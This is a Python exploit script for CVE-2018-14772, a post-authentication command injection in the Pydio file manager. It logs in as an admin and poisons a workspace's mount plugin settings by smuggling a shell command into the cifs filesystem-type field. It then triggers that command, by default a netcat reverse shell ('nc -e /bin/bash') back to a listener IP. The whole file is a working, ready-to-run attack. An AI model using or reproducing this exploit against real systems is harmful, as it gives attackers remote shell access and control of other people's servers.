"""
This is (hopefully) a one shot exploitation script of CVE-2018-14772, a post-auth
Remote Code Execution Vulnerability in Pydio Filesystem Manager.
"""

import urllib
import argparse
import requests
import xml.etree.ElementTree

DEBUG = False
FAIL_ACCESS_STRING = "You are not allowed to access this resource"

def parse_token(response_text, token_type):
    if DEBUG:
        print(f"[*] parsing {token_type} from response")
    try:
        if token_type not in ["client_id", "secure_token"]:
            print("  [!] select correct token to parse ('client_id' or 'secure_token')")
            exit(1)
        if token_type == "client_id":
            secure_token = response_text.split("\"SECURE_TOKEN\":")[1][:34].replace("\"","")
        else:
            secure_token = response_text.split("\"")[-2]
        if len(secure_token) == 0:
            raise Exception
        return secure_token
    except Exception as e:
        print("  [!] could not parse token, check response text:")
        print(f"{e}")
        print(response_text)
        exit(1)

def process_request(session, request_type, url, message, headers=None, params=None, success=None, loud=False):
    if loud:
        print(f"[*] {message}")
    if request_type == "get":
        response = session.get(
            URL,
            headers=headers,
            params=params
        )
    elif request_type == "post":
        response = session.post(
            URL,
            headers=headers,
            data=params
        )       
    else:
        print(f"  [!] incorrect request type ({request_type}")
        exit(1)
    if DEBUG:
        print(response.status_code)
        print(response.text)
    if response.status_code == 204:
        global USERNAME
        print("  [!] {} doesn't appear to be an admin :(".format(USERNAME))
        print("  [!] exiting...")
        exit(1)
    elif response.status_code != 200:
        print(f"  [!] error sending {message} request ({response.status_code})")
        exit(1)
    else:
        if success:
            if success not in response.text:
                print(f"  [!] success condition not met for {message} request")
                print(f"    [*] required {success} in response")
                exit(1)
        if FAIL_ACCESS_STRING in response.text:
            print(f"  [!] access failure on {URL}")
            print(f"    [*] type:\t\t{request_type}")
            print(f"    [*] url:\t\t{URL}")
            print(f"    [*] headers:\t{headers}")
            print(f"    [*] params:\t\t{params}")
            exit(1)
        if loud:
            print("  [+] success")
        return response


def get_secure_token(live_session):
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0"
    }
    r = process_request(live_session, "get", URL, "grabbing client_id", headers=headers, params=None)
    client_id = parse_token(r.text, "client_id")
    return client_id

def login(live_session, client_id):
    """ 
    logs in and returns a session that is successfully auth'd, along with the secure token used
    for subsequent requests
    """
    global USERNAME, PASSWORD           # really, i make myself sick sometimes
    print("[*] exploit credentials")
    print(f"\tusername: '{USERNAME}'\n\tpassword: '{PASSWORD}'")
    first_request_url = f"{URL}index.php"
    first_params = {
        "dir": "/",
        "get_action": "ls",
        "options": "al",
        "secure_token": client_id
    }
    process_request(live_session, "get", first_request_url, "staging login",params=first_params, loud=DEBUG)

    seed_request_url = f"{URL}index.php"
    seed_params = {
        "get_action": "get_seed",
        "secure_token": client_id
    }
    r = process_request(live_session, "post", seed_request_url, "seed setup", params=seed_params, loud=DEBUG)
    seed_val = r.text

    login_url = f"{URL}/index.php"
    second_params = {
        "get_action": "login",
        "login_seed": seed_val,
        "userid": USERNAME,
        "password": PASSWORD,
        "secure_token": client_id
    }
    r = process_request(live_session, "post", login_url, "login POST",params=second_params, loud=DEBUG)
    login_token = parse_token(r.text, "secure_token")
    return login_token

def enumerate_workspaces(live_session, client_id, secure_token):
    list_req = {
        "message": "enumerating repositories",
        "request_type": "post",
        "url": f"{URL}index.php",
        "params": {
            "get_action": "ls",
            "options": "al",
            "dir": "/data/repositories",
            "secure_token": secure_token
        },
        "success": "repositories",
        "loud": True
    }
    list_response = process_request(
        live_session,
        list_req["request_type"], 
        list_req["url"],
        list_req["message"],
        params=list_req["params"],
        success=list_req["success"],
        loud=list_req["loud"]
    )
    # find editable workspaces from the XML that's returned
    potential_workspaces = []
    e = xml.etree.ElementTree.fromstring(list_response.text)
    for node in e.iter("tree"):
        if "ajxp_mime" in node.attrib.keys():
            if node.attrib["ajxp_mime"] == "repository_editable":
                repo_name = node.attrib["text"]
                repo_id = node.attrib["repository_id"]
                potential_workspaces.append({"name": repo_name,"id":repo_id})
    
    if len(potential_workspaces) > 0:
        print("  [+] found {} potential workspaces".format(len(potential_workspaces)))
        return potential_workspaces
    else:
        print("  [!] didn't find any editable workspaces :( ... exiting")
        exit(1)

def pre_injection_staging(live_session, client_id, secure_token):
    staging = [
        {
            "message": "staging injection",
            "request_type": "post",
            "url": f"{URL}index.php",
            "params": {
                "get_action": "switch_repository",
                "repository_id": "ajxp_conf",
                "secure_token": secure_token
            },
            "success": "",
            "loud": DEBUG
        },
    ]

    for staging_step in staging:
        process_request(
            live_session,
            staging_step["request_type"], 
            staging_step["url"],
            staging_step["message"],
            params=staging_step["params"],
            success=staging_step["success"],
            loud=staging_step["loud"]
        )

def inject_exploit(live_session, client_id, secure_token, repository):
    # if we haven't set a custom payload, fire off a default nc rev shell
    global PAYLOAD, LISTENER_IP, LISTENER_PORT
    if not PAYLOAD:
        PAYLOAD = f"nc -e /bin/bash {LISTENER_IP} {LISTENER_PORT}"
    encoded_injection = "{\"delete\":{},\"add\":{\"meta.mount\":{\"FILESYSTEM_TYPE\":\"cifs\"," + \
          "\"FILESYSTEM_TYPE\":\"cifs\",\"MOUNT_OPTIONS\":\"user=AJXP_USER,pass=AJXP_PASS" + \
          ",uid=AJXP_SERVER_UID,gid=AJXP_SERVER_GID\",\"MOUNT_RESULT_SUCCESS\":\"32\"," + \
          "\"USE_AUTH_STREAM\":\"true\"}},\"edit\":{\"meta.mount\":{" + \
          f"\"FILESYSTEM_TYPE\":\"cifs;{PAYLOAD};mount -t cifs\"," + \
          "\"MOUNT_OPTIONS\":\"user=AJXP_USER,pass=AJXP_PASS,uid=AJXP_SERVER_UID,gid=AJXP_SERVER_GID\"," + \
          "\"MOUNT_RESULT_SUCCESS\":\"32\",\"USE_AUTH_STREAM\":\"true\",\"UNC_PATH\":\"//127.0.0.1/test\"," + \
          "\"MOUNT_POINT\":\"/tmp/somewhere\",\"USER\":\"admin\",\"PASS\":\"password\"}}}"

    injection = [
        {
            "message": "editing repository",
            "request_type": "post",
            "url": f"{URL}index.php",
            "params": {
                "get_action": "edit",
                "sub_action": "edit_repository",
                "repository_id": repository["id"],
                "secure_token": secure_token
            },
            "success": "",
            "loud": DEBUG
        },
        {
            "message": "poisoning plugin",
            "request_type": "post",
            "url": f"{URL}index.php",
            "params": {
                "get_action": "edit",
                "sub_action": "meta_source_edit",
                "repository_id": repository["id"],
                "bulk_data": encoded_injection,
                "secure_token": secure_token
            },
            "success": "Successfully edited meta source",
            "loud": DEBUG
        },
        {
            "message": "poisoning workspace",
            "request_type": "post",
            "url": f"{URL}index.php",
            "params": {
                "get_action": "edit",
                "sub_action":"edit_repository_data",
                "repository_id": repository["id"],
                "secure_token": secure_token
            },
            "success": "Successfully edited workspace",
            "loud": DEBUG
        },
    ]
    for injection_step in injection:
        process_request(
            live_session,
            injection_step["request_type"], 
            injection_step["url"],
            injection_step["message"],
            params=injection_step["params"],
            success=injection_step["success"],
            loud=injection_step["loud"]
        )

def check_injection(live_session, client_id, secure_token, repository):
    check_edit = {
        "message": "confirming injection",
        "request_type": "post",
        "url": f"{URL}index.php",
        "params": {
            "get_action": "edit", 
            "sub_action": "edit_repository", 
            "repository_id": repository["id"], 
            "secure_token": secure_token
        },
        "success": "",
        "loud": DEBUG
    }
    check = process_request(
            live_session,
            check_edit["request_type"], 
            check_edit["url"],
            check_edit["message"],
            params=check_edit["params"],
            success=check_edit["success"],
            loud=check_edit["loud"]
        )
    e = xml.etree.ElementTree.fromstring(check.text)
    print("[*] did we inject our poisoned plugin?")
    try:
        plugin_settings = e[0][15].text
        if ";" in plugin_settings:
            print("  [+] payload injected :)")
            return True
        else:
            print("  [!] nope..plugin was added, but playload wasn't injected :(")
            return False
    except:
        print("  [!] nope..the plugin wasn't added :(")
        return False

def trigger_exploit(live_session, secure_token, repository):
    trigger_url = f"{URL}index.php"
    trigger_params = {
        "get_action": "switch_repository",
        "repository_id": repository["id"],
        "secure_token": f"{secure_token}"
    }
    process_request(live_session, "post", trigger_url, "triggering exploit", params=trigger_params, loud=DEBUG)

def initialize_parser():
    parser = argparse.ArgumentParser(description='[*] exploit some pydio boxes (academically)')
    required_group = parser.add_argument_group(title='required arguments')
    required_group.add_argument(
        '-t',
        dest='target',
        required=True,
        help='this is the target URI for the pydio instance..i.e. http://127.0.0.1:31337/pydio/'
    )
    required_group.add_argument(
        '-u',
        dest='username',
        required=True,
        help='this is the username of the admin user'
    )
    required_group.add_argument(
        '-p',
        dest='password',
        required=True,
        help='this is the password of the admin user'
    )
    required_group.add_argument(
        '-L',
        dest='listener_ip',
        required=True,
        help='IP address to catch reverse shell on'
    )
    required_group.add_argument(
        '-P',
        dest='listener_port',
        required=True,
        help='port to catch reverse shell on'
    )
    parser.add_argument(
        '--payload',
        dest='payload',
        default=None,
        help='custom shell command payload (wrap in quotes) i.e. \'whoami > /tmp/test\''
    )
    return parser

def process_target(target):
    # add / to the URI if it doesn't terminate with /..because otherwise things get weird
    if target[-1] != "/":
        target += "/"
    return target

def main():
    parser = initialize_parser()
    args = parser.parse_args()
    # set globals because i'm a filthy person
    global URL, USERNAME, PASSWORD, LISTENER_IP, LISTENER_PORT, PAYLOAD
    URL = process_target(args.target)
    USERNAME = args.username
    PASSWORD = args.password
    LISTENER_IP = args.listener_ip
    LISTENER_PORT = args.listener_port
    PAYLOAD = args.payload
    try:
        live_session = requests.Session()
        client_id = get_secure_token(live_session)
        secure_token = login(live_session, client_id)
        pre_injection_staging(live_session, client_id, secure_token)
        potential_workspaces = enumerate_workspaces(live_session, client_id, secure_token)
        successful_exploitation = False
        for repository in potential_workspaces:
            if not successful_exploitation:
                print("[*] trying to exploit workspace ({}) [{}]".format(repository["name"], repository["id"]))
                inject_exploit(live_session, client_id, secure_token, repository)
                successful_exploitation = check_injection(live_session, client_id, secure_token, repository)
                if successful_exploitation:
                    print("[*] triggering exploit\n")
                    print("[*][~][*][~][*][~][*]     !  brace for shell !     [*][~][*][~][*][~][*]")
                    print("[*][~][*][~][*][~][*]     !  brace for shell !     [*][~][*][~][*][~][*]")
                    print("[*][~][*][~][*][~][*]     !  brace for shell !     [*][~][*][~][*][~][*]")
                    trigger_exploit(live_session, secure_token, repository)
                    print("\n... did you catch it?")
            else:
                exit(0)

    except KeyboardInterrupt:
        print("\n  [!] keyboard interrupt detected...exiting")
        exit(0)

if __name__ == "__main__":
    main()
















